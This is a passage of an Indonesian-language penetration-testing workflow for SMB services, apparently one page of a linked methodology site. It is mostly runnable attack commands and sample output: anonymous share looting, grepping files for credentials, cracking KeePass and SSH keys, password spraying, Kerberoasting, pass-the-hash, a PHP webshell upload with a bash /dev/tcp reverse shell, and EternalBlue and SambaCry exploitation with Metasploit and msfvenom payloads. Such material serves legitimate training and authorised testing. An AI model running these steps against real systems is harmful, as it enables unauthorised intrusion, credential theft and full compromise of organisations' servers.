SMB   10.10.11.200  445  [!] Connection refused
```

➡️ **Coba port 139:**

Bash

```
nmap -Pn -p 139 $TARGET
smbclient -p 139 -N -L //$TARGET/
```

**OUTPUT GAGAL ❌ — Host seems down:**

text

```
CRITICAL: Could not connect to SMB on 10.10.11.200:445
```

➡️ **Coba bypass firewall:**

Bash

```
nmap -Pn -sS -p 445 --source-port 53 $TARGET
```

---

### Langkah 0.3 — Nmap Detailed Fingerprint

Bash

```
# Command 1: Service version + OS script
nmap -sV -p 139,445 --script smb-os-discovery.nse $TARGET -oN nmap_smb_fingerprint.txt

# Command 2: Jika Command 1 lambat, ini alternatif cepat
nmap -sC -sV -p 139,445 $TARGET --open
```

**OUTPUT BERHASIL ✅ — Windows:**

text

```
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FILE01
|   NetBIOS computer name: FILE01\x00
|   Domain name: CORP.LOCAL
|   FQDN: FILE01.CORP.LOCAL
```

**OUTPUT BERHASIL ✅ — Linux Samba:**

text

```
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2 (workgroup: WORKGROUP)
| smb-os-discovery:
|   OS: Unix (Samba 4.6.2)
|   NetBIOS computer name: DEVELOPMENT\x00
```

> **📌 SIMPAN INFO INI:**
> 
> Bash
> 
> ```
> # Tambahkan hostname ke /etc/hosts agar resolusi nama bekerja
> echo "$TARGET FILE01.CORP.LOCAL FILE01 CORP.LOCAL" | sudo tee -a /etc/hosts
> ```

**Lanjut ke FASE 1.**

---

## ═══════════════════════════════════════

## FASE 1: ANONYMOUS & NULL SESSION ENUMERATION

## ═══════════════════════════════════════

> **Tujuan fase ini:** Cari informasi SEBANYAK MUNGKIN tanpa kredensial. Jangan skip, sering ada data sensitif di sini.

### Langkah 1.1 — Cek Anonymous Share Access (3 tool sekaligus)

Bash

```
# Command 1: smbclient — paling reliable untuk list shares
smbclient -N -L //$TARGET/

# Command 2: smbmap — langsung tampilkan permissions
smbmap -H $TARGET

# Command 3: NetExec — cek dengan user kosong DAN guest
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u 'guest' -p '' --shares
```

**OUTPUT BERHASIL ✅ — Ada share accessible:**

text

```
[+] IP: 10.10.11.200:445  Name: corp-fileserver.local

    Disk                    Permissions     Comment
    ----                    -----------     -------
    ADMIN$                  NO ACCESS       Remote Admin
    C$                      NO ACCESS       Default share
    IPC$                    READ ONLY       Remote IPC
    CompanyData             READ ONLY       General Company Documents
    HR_Department           NO ACCESS       HR Private Docs
    IT_Uploads              READ, WRITE     IT Temporary Staging
```

**Cara baca dan tindakan:**

|Permission|Share|Tindakan Langsung|
|---|---|---|
|`NO ACCESS`|ADMIN,C,C|Skip, butuh admin credentials|
|`READ ONLY`|CompanyData|**→ Loot semua file! Ke Langkah 1.2**|
|`READ, WRITE`|IT_Uploads|**→ Potential upload webshell/reverse shell!**|
|`READ ONLY`|IPC$|Bisa untuk RPC enumeration|

**OUTPUT GAGAL ❌ — NT_STATUS_ACCESS_DENIED:**

text

```
session setup failed: NT_STATUS_ACCESS_DENIED
```

➡️ Anonymous diblokir. Coba:

Bash

```
# Variasi 1: Guest explicit
smbclient -U 'guest%' -L //$TARGET/

# Variasi 2: Username sembarang (kadang berhasil di Samba)
smbclient -U 'nobody%' -L //$TARGET/

# Variasi 3: Paksa protocol lama (jika target sangat kuno)
smbclient --option='client min protocol=NT1' -N -L //$TARGET/
```

**OUTPUT GAGAL ❌ — SMB1 disabled:**

text

```
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
```

➡️ Target butuh SMBv1 tapi kamu konek dengan SMBv2+:

Bash

```
smbclient --option='client min protocol=NT1' -N -L //$TARGET/
```

**OUTPUT GAGAL ❌ — Semua share NO ACCESS:**

text

```
Disk            Permissions     Comment
----            -----------     -------
ADMIN$          NO ACCESS
C$              NO ACCESS
IPC$            NO ACCESS
```

➡️ Anonymous benar-benar diblokir. Skip ke **Fase 4 (Vulnerability Scan)** dulu, atau langsung **Fase 5 (Password Attack)** jika punya wordlist.

---

### Langkah 1.2 — Nmap NSE Enumeration (Jalankan Paralel)

Bash

```
# Command 1: Enumerate shares + users via Nmap
nmap -p 445 --script smb-enum-shares,smb-enum-users $TARGET

# Command 2: Cek security config
nmap -p 445 --script smb2-security-mode $TARGET
```

**OUTPUT BERHASIL ✅ — smb2-security-mode:**

text

```
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

**Interpretasi smb2-security-mode:**

|Output|Arti|Tindakan|
|---|---|---|
|`signing enabled but not required`|**VULNERABLE ke NTLM Relay**|Catat untuk Fase 7 (NTLM Relay)|
|`signing enabled and required`|Aman dari relay|Fokus ke enumeration saja|

---

## ═══════════════════════════════════════

## FASE 2: SHARE EXPLORATION & FILE LOOTING

## ═══════════════════════════════════════

> **Tujuan:** Download SEMUA file dari share yang accessible. Jangan pilih-pilih dulu, download semua, filter belakangan.

### Langkah 2.1 — Masuk ke Share & Download Semua File

Bash

```
# Method 1: smbclient interaktif (PALING RELIABLE untuk navigasi manual)
smbclient -N //$TARGET/CompanyData

# Di dalam prompt smbclient, jalankan ini:
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
smb: \> exit
```

**OUTPUT BERHASIL ✅:**

text

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \HR\employee_list.xlsx of size 45231 as employee_list.xlsx
getting file \IT\server_config.txt of size 1203 as server_config.txt
getting file \backup\backup_2024.zip of size 892345 as backup_2024.zip
getting file \admin\notes.txt of size 456 as notes.txt
```

➡️ File sudah di-download. Pindahkan ke folder loot:

Bash

```
mv *.* ~/smb_loot/files/ 2>/dev/null
mv */* ~/smb_loot/files/ 2>/dev/null
```

Bash

```
# Method 2: smbmap non-interaktif (lebih cepat untuk download masif)
smbmap -H $TARGET -u 'guest' -p '' -R CompanyData --download '.*'

# Method 3: Recursive via smbclient one-liner
smbclient -N //$TARGET/CompanyData -c 'recurse ON; prompt OFF; mget *'
```

**OUTPUT GAGAL ❌ — Permission denied saat download:**

text

```
NT_STATUS_ACCESS_DENIED opening remote file \confidential\file.pdf
```

➡️ File itu butuh privilege lebih tinggi. Catat namanya, skip dulu, balik setelah dapat creds.

---

### Langkah 2.2 — Analisis File yang Didownload (KRITIS!)

Bash

```
# Jalankan semua grep ini sekaligus — cari credentials tersembunyi
cd ~/smb_loot/files/

# Cari keyword password
grep -ri "password" . 2>/dev/null | grep -v ".xlsx:" | head -50
grep -ri "passwd" . 2>/dev/null | head -20
grep -ri "secret" . 2>/dev/null | head -20
grep -ri "credential" . 2>/dev/null | head -20

# Cari private key SSH
grep -rl "BEGIN.*PRIVATE KEY" . 2>/dev/null
grep -rl "BEGIN RSA PRIVATE KEY" . 2>/dev/null

# Cari username/email (kandidat untuk spraying)
grep -rE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" . 2>/dev/null

# Cari file database
find . -name "*.kdbx" -o -name "*.db" -o -name "*.sqlite" 2>/dev/null

# Cari config files yang biasanya ada credentials
find . \( -name "*.config" -o -name "*.conf" -o -name ".env" -o -name "*.yml" -o -name "*.json" \) 2>/dev/null \
    | xargs grep -iE "(password|pass|secret|key|token)" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Ketemu password di description:**

text

```
./admin/notes.txt: "Reminder to sysadmin: User 'svc_backup' pass: Backup2023!"
./HR/config.php:   $db_password = "P@ssw0rd_DB_2024";
```

➡️ **SIMPAN CREDENTIALS:**

Bash

```
export USER="svc_backup"
export PASS="Backup2023!"
echo "$USER:$PASS" >> ~/smb_loot/creds/found_creds.txt
```

➡️ **Langsung validasi! Ke Fase 6.**

**OUTPUT BERHASIL ✅ — Ketemu SSH private key:**

text

```
./backup/.ssh/id_rsa
./IT/jordan_id_rsa
```

➡️ **SIMPAN DAN SET PERMISSION:**

Bash

```
cp ./backup/.ssh/id_rsa ~/smb_loot/keys/id_rsa
chmod 600 ~/smb_loot/keys/id_rsa

# Cek apakah ada passphrase
ssh-keygen -y -f ~/smb_loot/keys/id_rsa
# Jika minta passphrase → crack dengan john (ke Langkah 2.3)
# Jika langsung keluar public key → tidak ada passphrase, langsung pakai
```

➡️ **Coba SSH langsung** (jika ada username dari notes.txt atau email):

Bash

```
# Coba username dari file yang ditemukan
ssh -i ~/smb_loot/keys/id_rsa jordan@$TARGET
ssh -i ~/smb_loot/keys/id_rsa svc_backup@$TARGET

# → Jika berhasil, lanjut ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a></a>
```

**OUTPUT BERHASIL ✅ — Ketemu file .kdbx (KeePass database):**

text

```
./backup/company_passwords.kdbx
```

➡️ **Crack KeePass database:**

Bash

```
# Extract hash dari .kdbx
keepass2john ./backup/company_passwords.kdbx > keepass.hash

# Crack dengan hashcat
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt

# Atau dengan john
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Langkah 2.3 — Crack SSH Key Passphrase (Jika key ada passphrase)

Bash

```
# Convert key ke format john
ssh2john ~/smb_loot/keys/id_rsa > ssh_key.hash

# Crack passphrase
john ssh_key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**OUTPUT BERHASIL ✅:**

text

```
id_rsa:rockyou123       (id_rsa)
```

➡️ Passphrase adalah `rockyou123`:

Bash

```
ssh -i ~/smb_loot/keys/id_rsa -o "IdentitiesOnly=yes" user@$TARGET
# Masukkan passphrase: rockyou123
```

**OUTPUT GAGAL ❌ — john tidak bisa crack:**

text

```
0 password hashes cracked, 0 left
```

➡️ Coba wordlist lain:

Bash

```
# Coba dengan rockyou + rules
john ssh_key.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=Best64

# Coba wordlist lebih besar
john ssh_key.hash --wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt
```

➡️ Jika masih gagal, simpan hash dan lanjutkan workflow. Mungkin nanti dapat password hint dari tempat lain.

---

### Langkah 2.4 — Explore Share dengan Write Access

> Jika di Langkah 1.1 ada share dengan **READ, WRITE**, ini adalah kesempatan emas.

Bash

```
# Cek apakah share yang writable adalah web root
# Caranya: upload file test kecil, coba akses via HTTP
echo "test" > test_probe.txt
smbclient -N //$TARGET/IT_Uploads -c 'put test_probe.txt'

# Cek apakah ada web server (port 80/443)
curl -s http://$TARGET/test_probe.txt
curl -s http://$TARGET/IT_Uploads/test_probe.txt
```

**OUTPUT BERHASIL ✅ — File accessible via HTTP:**

HTML

```
test
```

➡️ **Share ini adalah web root!** Upload webshell:

Bash

```
# Buat webshell PHP
cat > shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo '<pre>' . htmlspecialchars(shell_exec($cmd)) . '</pre>';
}
?>
EOF

# Upload via smbclient
smbclient -N //$TARGET/IT_Uploads -c 'put shell.php'

# Test eksekusi
curl "http://$TARGET/shell.php?cmd=id"
curl "http://$TARGET/shell.php?cmd=whoami"
```

**OUTPUT BERHASIL ✅ — Command execution:**

text

```
<pre>www-data</pre>
```

➡️ **SHELL! Upgrade ke reverse shell:**

Bash

```
# Setup listener dulu
nc -lvnp $LPORT &

# Trigger reverse shell via webshell
curl "http://$TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
```

**OUTPUT GAGAL ❌ — HTTP 404, file tidak accessible:**

text

```
404 Not Found
```

➡️ Share bukan web root, tapi masih writable. Simpan info ini, mungkin berguna nanti untuk menaruh file yang akan dieksekusi oleh scheduled task atau service lain.

---

## ═══════════════════════════════════════

## FASE 3: RPC ENUMERATION & USER EXTRACTION

## ═══════════════════════════════════════

> **Tujuan:** Dapatkan daftar username lengkap untuk password spraying. Ini adalah langkah yang sering dilewati tapi sangat valuable.

### Langkah 3.1 — Koneksi RPC via Null Session

Bash

```
# Command utama: buka prompt RPC interaktif
rpcclient -U "" -N $TARGET
```

**OUTPUT BERHASIL ✅ — Masuk ke prompt:**

text

```
rpcclient $>
```

➡️ Jalankan semua perintah ini secara berurutan:

Bash

```
# Di dalam prompt rpcclient:
rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydispinfo
rpcclient $> getdompwinfo
rpcclient $> quit
```

**Output `enumdomusers` yang dicari:**

text

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[svc_backup] rid:[0x3e8]
user:[clark] rid:[0x3e9]
user:[diana] rid:[0x3ea]
user:[bruce] rid:[0x3eb]
```

**Output `querydispinfo` yang dicari (JACKPOT):**

text

```
index: 0x2 RID: 0x3e8 acb: 0x00000210
name: svc_backup
desc: Password: Backup2023!    <-- !! PASSWORD BOCOR DI FIELD DESCRIPTION !!
```

**OUTPUT GAGAL ❌ — Cannot connect:**

text

```
Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE
```

➡️ Null session RPC diblokir. Gunakan alternatif:

Bash

```
# Alternatif 1: RID Brute via NetExec
nxc smb $TARGET -u '' -p '' --rid-brute 10000 | tee rid_output.txt

# Alternatif 2: Dengan user guest
nxc smb $TARGET -u 'guest' -p '' --rid-brute 10000

# Alternatif 3: enum4linux-ng
enum4linux-ng $TARGET -A
```

---

### Langkah 3.2 — Ekstrak Username ke File

Bash

```
# Dari output rpcclient
rpcclient -U "" -N $TARGET -c "enumdomusers" \
    | awk -F'[' '{print $2}' \
    | awk -F']' '{print $1}' \
    > ~/smb_loot/creds/users.txt

# Verifikasi isi file
cat ~/smb_loot/creds/users.txt

# Dari output NetExec RID brute (filter dan bersihkan)
cat rid_output.txt | grep "SidTypeUser" | awk '{print $6}' | cut -d'\' -f2 >> ~/smb_loot/creds/users.txt

# Hapus duplikat
sort -u ~/smb_loot/creds/users.txt -o ~/smb_loot/creds/users.txt

echo "[*] Total users found: $(wc -l < ~/smb_loot/creds/users.txt)"
```

**Output yang diharapkan:**

text

```
administrator
guest
svc_backup
clark
diana
bruce

[*] Total users found: 6
```

---

## ═══════════════════════════════════════

## FASE 4: VULNERABILITY SCANNING

## ═══════════════════════════════════════

> **Tujuan:** Cek apakah ada CVE kritis yang bisa langsung kasih shell tanpa perlu creds.

### Langkah 4.1 — Scan CVE Kritis (Jalankan Semua Sekaligus)

Bash

```
# Command 1: EternalBlue MS17-010 (Windows 7/2008 R2 - SYSTEM langsung)
nmap -p 445 --script smb-vuln-ms17-010 $TARGET

# Command 2: SambaCry CVE-2017-7494 (Linux Samba 3.5.0 - 4.6.4)
nmap -p 445 --script smb-vuln-cve-2017-7494 $TARGET

# Command 3: MS08-067 (Windows XP/2003 - sangat legacy)
nmap -p 445 --script smb-vuln-ms08-067 $TARGET

# Command 4: Jalankan semua vuln script sekaligus
nmap -p 139,445 --script "smb-vuln-*" --script-args unsafe=1 $TARGET -oN vuln_scan.txt

# Command 5: SMBGhost CVE-2020-0796 (Windows 10 1903/1909)
nmap -p 445 --script smb-vuln-cve-2020-0796 $TARGET
```

**OUTPUT BERHASIL ✅ — MS17-010 VULNERABLE:**

text

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

➡️ **JACKPOT! Langsung ke Fase 7A — EternalBlue Exploitation**

**OUTPUT BERHASIL ✅ — SambaCry VULNERABLE:**

text

```
| smb-vuln-cve-2017-7494:
|   VULNERABLE:
|   SAMBA Remote Code Execution from Writable Share
|     State: VULNERABLE (Exploitable)
```

➡️ **Langsung ke Fase 7B — SambaCry Exploitation**

**OUTPUT AMAN ✅ — Not vulnerable:**

text

```
| smb-vuln-ms17-010:
|   NOT VULNERABLE
```

➡️ Lanjut ke **Fase 5 — Password Attack.**

---

## ═══════════════════════════════════════

## FASE 5: PASSWORD ATTACK

## ═══════════════════════════════════════

> **PERINGATAN:** Cek dulu lockout policy sebelum spraying! Jangan sampai lock akun.

### Langkah 5.1 — Cek Account Lockout Policy DULU

Bash

```
# WAJIB DILAKUKAN SEBELUM SPRAYING
rpcclient -U "" -N $TARGET -c "getdompwinfo"
```

**Output yang dicari:**

text

```
min_password_length: 8
password_properties: 0x00000001
  DOMAIN_PASSWORD_COMPLEX
lockout_threshold: 5              <-- Hanya boleh salah 5x sebelum lock!
reset_lockout_count: 30           <-- Reset setiap 30 menit
lockout_duration: 30              <-- Lock selama 30 menit
```

**Aturan spraying berdasarkan lockout_threshold:**

|Threshold|Strategi|
|---|---|
|0 (unlimited)|Bebas brute force|
|3-5|Spray MAX 2 password, tunggu 35 menit, spray lagi|
|10+|Spray 5-7 password per sesi|
|Tidak bisa cek|Asumsikan threshold = 3, spray HATI-HATI|

---

### Langkah 5.2 — Password Spraying

Bash

```
# Siapkan password list dari temuan sebelumnya + common passwords
cat > ~/smb_loot/creds/passwords.txt << 'EOF'
Password123!
Welcome2023!
Summer2024!
Company2024!
Admin2024!
Backup2023!
EOF

# Tambahkan nama perusahaan/hostname sebagai kandidat
echo "CORP2024!" >> ~/smb_loot/creds/passwords.txt
echo "FILE012024!" >> ~/smb_loot/creds/passwords.txt

# Spray! --continue-on-success agar tidak berhenti saat ketemu 1 valid
nxc smb $TARGET -u ~/smb_loot/creds/users.txt -p ~/smb_loot/creds/passwords.txt \
    --continue-on-success \
    | tee spray_results.txt

# Filter yang berhasil
grep "\[+\]" spray_results.txt
```

**OUTPUT BERHASIL ✅ — Credentials valid (standard user):**

text

```
SMB  10.10.11.200  445  FILE01  [+] CORP\diana:Welcome2023!
```

➡️ Simpan dan validasi lebih lanjut:

Bash

```
export USER="diana"
export PASS="Welcome2023!"
echo "$USER:$PASS" >> ~/smb_loot/creds/found_creds.txt
```

➡️ Lanjut ke **Fase 6.**

**OUTPUT BERHASIL ✅ — Admin credentials (SYSTEM/root langsung):**

text

```
SMB  10.10.11.200  445  FILE01  [+] CORP\Administrator:Password123! (Pwn3d!)
```

➡️ `(Pwn3d!)` = user ini adalah local admin! Langsung ke **Fase 7D — Shell Execution.**

**OUTPUT GAGAL ❌ — NT_STATUS_ACCOUNT_LOCKED_OUT:**

text

```
SMB  10.10.11.200  445  FILE01  [-] CORP\clark:Password123! STATUS_ACCOUNT_LOCKED_OUT
```

➡️ **STOP SPRAYING SEKARANG!** Tunggu sesuai lockout duration. Cek:

Bash

```
# Cek berapa lama harus tunggu
rpcclient -U "" -N $TARGET -c "getdompwinfo" | grep "lockout_duration"
# Tunggu durasi tsb + 5 menit buffer, lalu lanjut dengan 1 password saja
```

**OUTPUT GAGAL ❌ — Semua LOGON_FAILURE:**

text

```
SMB  10.10.11.200  445  FILE01  [-] CORP\diana:Password123! STATUS_LOGON_FAILURE
SMB  10.10.11.200  445  FILE01  [-] CORP\diana:Welcome2023! STATUS_LOGON_FAILURE
```

➡️ Password list tidak cocok. Coba:

Bash

```
# Opsi 1: Pakai rockyou.txt tapi PERHATIKAN lockout!
# Spray 1 password per session, tunggu antara session
nxc smb $TARGET -u ~/smb_loot/creds/users.txt -p 'Password1' --continue-on-success

# Opsi 2: Cek apakah ada password hint di share yang belum diexplore
# Opsi 3: Lanjut dulu ke Fase 4 vulnerability scan, mungkin ada path RCE lain
```

---

## ═══════════════════════════════════════

## FASE 6: AUTHENTICATED ENUMERATION

## ═══════════════════════════════════════

> **Masuk sini jika sudah punya credentials valid dari Fase 2 atau Fase 5.**

### Langkah 6.1 — Validasi & Cek Privilege Level

Bash

```
# Validasi credentials
nxc smb $TARGET -u "$USER" -p "$PASS"
```

**OUTPUT BERHASIL ✅ — Standard user:**

text

```
SMB  10.10.11.200  445  FILE01  [+] CORP\diana:Welcome2023!
```

(Tidak ada `Pwn3d!` = bukan admin lokal)

**OUTPUT BERHASIL ✅ — Admin:**

text

```
SMB  10.10.11.200  445  FILE01  [+] CORP\Administrator:Password123! (Pwn3d!)
```

---

### Langkah 6.2 — Authenticated Share Enumeration

Bash

```
# Lihat share yang bisa diakses dengan creds baru
nxc smb $TARGET -u "$USER" -p "$PASS" --shares

# List isi share secara rekursif
smbmap -H $TARGET -u "$USER" -p "$PASS" -R

# Cek siapa lagi yang sedang login ke sistem
nxc smb $TARGET -u "$USER" -p "$PASS" --loggedon-users

# Dump local users
nxc smb $TARGET -u "$USER" -p "$PASS" --users

# Dump local groups
nxc smb $TARGET -u "$USER" -p "$PASS" --groups
```

**OUTPUT BERHASIL ✅ — Share baru yang terbuka:**

text

```
    HR_Department   READ ONLY     HR Private Docs    <-- Sebelumnya NO ACCESS!
    C$              NO ACCESS
    ADMIN$          NO ACCESS
```

➡️ Loot share HR_Department:

Bash

```
smbclient -U "$USER%$PASS" //$TARGET/HR_Department -c 'recurse ON; prompt OFF; mget *'
```

---

### Langkah 6.3 — Bridge ke Active Directory (Jika domain environment)

Bash

```
# Jika nxc tadi output ada "domain:CORP.LOCAL" → ini environment AD!

# Kerberoasting: Request TGS ticket untuk service accounts
impacket-GetUserSPNs "CORP.LOCAL/$USER:$PASS" -dc-ip $TARGET -request \
    -outputfile ~/smb_loot/creds/kerberoast_hashes.txt

# ASREPRoasting: Cari user yang tidak butuh pre-auth
impacket-GetNPUsers "CORP.LOCAL/" -usersfile ~/smb_loot/creds/users.txt \
    -dc-ip $TARGET -format hashcat \
    -outputfile ~/smb_loot/creds/asrep_hashes.txt

# BloodHound collection (jika sudah punya creds)
bloodhound-python -u "$USER" -p "$PASS" -ns $TARGET \
    -d CORP.LOCAL -c All \
    --zip -o ~/smb_loot/bloodhound/
```

**OUTPUT BERHASIL ✅ — Kerberoast hash didapat:**

text

```
$krb5tgs$23$*svc_mssql$CORP.LOCAL$CORP.LOCAL/svc_mssql*$a1b2c3...
```

➡️ Crack hash:

Bash

```
hashcat -m 13100 ~/smb_loot/creds/kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    --force -o cracked_kerberoast.txt

# Lihat hasil
cat cracked_kerberoast.txt
```

➡️ Setelah crack → lanjut ke **<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a></a>** dan **[🔥 Workflow 37 — Kerberoasting & AS-REP Roasting](/docs/kerberoasting-asreproasting)**

---

### Langkah 6.4 — Pass-The-Hash Attack (Jika punya NTLM hash)

Bash

```
# Dump hash menggunakan secretsdump (jika punya admin creds)
impacket-secretsdump "$USER:$PASS@$TARGET"

# Atau dari target yang sudah dieksploitasi sebelumnya
impacket-secretsdump "Administrator:Password123!@$TARGET"
```

**OUTPUT BERHASIL ✅:**

text

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
diana:1104:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Bash

```
# Simpan hash
export NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881"
echo "Administrator:$NTLM_HASH" >> ~/smb_loot/creds/ntlm_hashes.txt

# Pass-The-Hash ke SMB
nxc smb $TARGET -u "Administrator" -H "$NTLM_HASH"

# PTH ke service lain
nxc smb $TARGET -u "Administrator" -H "$NTLM_HASH" --shares
nxc winrm $TARGET -u "Administrator" -H "$NTLM_HASH"
```

**Crack NTLM hash offline:**

Bash

```
hashcat -m 1000 ~/smb_loot/creds/ntlm_hashes.txt \
    /usr/share/wordlists/rockyou.txt

# NTLMv2 hash (dari Responder)
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## ═══════════════════════════════════════

## FASE 7: EXPLOITATION PATHS

## ═══════════════════════════════════════

### PATH A — EternalBlue MS17-010 (Windows 7/Server 2008 R2)

> Prasyarat: Langkah 4.1 menunjukkan VULNERABLE

Bash

```
# ⚠️ WARNING: Bisa BSOD jika sistem tidak stabil. Verifikasi dulu.
# LANGKAH A1: Verifikasi ulang
nmap -p 445 --script smb-vuln-ms17-010 $TARGET

# LANGKAH A2: Buat pipes.txt
cat > /tmp/pipes.txt << 'EOF'
browser
spoolss
netlogon
lsarpc
samr
EOF

# LANGKAH A3a: Metasploit (recommended untuk stabilitas)
msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $TARGET;
set LHOST $LHOST;
set LPORT $LPORT;
set PAYLOAD windows/x64/shell_reverse_tcp;
check;
exploit
"
```

**OUTPUT BERHASIL ✅ — check menunjukkan vulnerable:**

text

```
[+] 10.10.11.200:445 - The target is vulnerable.
```

➡️ Lanjutkan `exploit`:

**OUTPUT BERHASIL ✅ — Shell didapat:**

text

```
[*] Command shell session 1 opened
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32> whoami
nt authority\system
```

➡️ **SYSTEM SHELL!** Langkah selanjutnya:

Bash

```
# Dump credentials untuk lateral movement
C:\> whoami /priv
C:\> net localgroup administrators
C:\> ipconfig /all    # Cari network lain untuk pivoting

# Dump hashes (untuk lateral movement)
# → Lanjut ke <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a></a>
# → Lanjut ke <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a></a>
```

**OUTPUT GAGAL ❌ — Exploit crash/BSOD:**

text

```
[*] Exploit completed, but no session was created.
```

➡️ Coba manual exploit:

Bash

```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git /tmp/autoblue
python2 /tmp/autoblue/zzz_exploit.py $TARGET /tmp/pipes.txt
```

**OUTPUT GAGAL ❌ — BSOD terpicu:**  
➡️ Target tidak stabil. Gunakan metode lain (Path D atau Path C). Dokumentasikan bahwa MS17-010 ada tapi BSOD.

---

### PATH B — SambaCry CVE-2017-7494 (Linux Samba 3.5.0 - 4.6.4)

> Prasyarat: Target Linux Samba dengan writable share

Bash

```
# LANGKAH B1: Konfirmasi versi Samba
nmap -sV -p 445 $TARGET

# LANGKAH B2: Buat payload .so
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=$LHOST LPORT=$LPORT \
    -f elf-so -o /tmp/libshell.so

# LANGKAH B3: Upload payload ke writable share
smbclient -N //$TARGET/IT_Uploads -c 'put /tmp/libshell.so'

# LANGKAH B4: Setup listener
nc -lvnp $LPORT &

# LANGKAH B5: Trigger exploit via Metasploit
msfconsole -q -x "
use exploit/linux/samba/is_known_pipename;
set RHOSTS $TARGET;
set SMB_SHARE_NAME IT_Uploads;
set SMB_SHARE_PATH /uploads;
set LHOST $LHOST;
set LPORT $LPORT;
exploit
"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] 10.10.11.200:445 - Exploit completed!
$ whoami
root
```

---

### PATH C — Credential Reuse ke Service Lain

> Prasyarat: Punya valid credentials dari Fase 2/5/6

Bash

```
# Test credentials ke SEMUA service yang mungkin aktif
# (jalankan semua, lihat mana yang connect)

# SSH (port 22) - paling umum di Linux
nxc ssh $TARGET -u "$USER" -p "$PASS"
ssh "$USER@$TARGET"                              # → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a></a>

# WinRM (port 5985) - Windows management
nxc winrm $TARGET -u "$USER" -p "$PASS"

# RDP (port 3389) - Windows GUI
nxc rdp $TARGET -u "$USER" -p "$PASS"

# FTP (port 21)
nxc ftp $TARGET -u "$USER" -p "$PASS"          # → ke <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a></a>

# Database ports
nxc mssql $TARGET -u "$USER" -p "$PASS"         # port 1433 → ke <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a></a>
nxc mysql $TARGET -u "$USER" -p "$PASS"         # port 3306 → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a></a>
```

**OUTPUT BERHASIL ✅ — WinRM Pwn3d:**

text

```
WINRM  10.10.11.200  5985  FILE01  [+] CORP\diana:Welcome2023! (Pwn3d!)
```

➡️ Spawn interactive shell:

Bash

```
evil-winrm -i $TARGET -u "$USER" -p "$PASS"

# Di dalam evil-winrm:
*Evil-WinRM* PS C:\Users\diana\Documents> whoami
corp\diana
*Evil-WinRM* PS C:\Users\diana\Documents> whoami /priv
# Cek privilege untuk privesc → ke <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold"><a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a></a>
```

**OUTPUT BERHASIL ✅ — SSH valid:**

text

```
SSH  10.10.11.200  22  [+] diana:Welcome2023! 
```

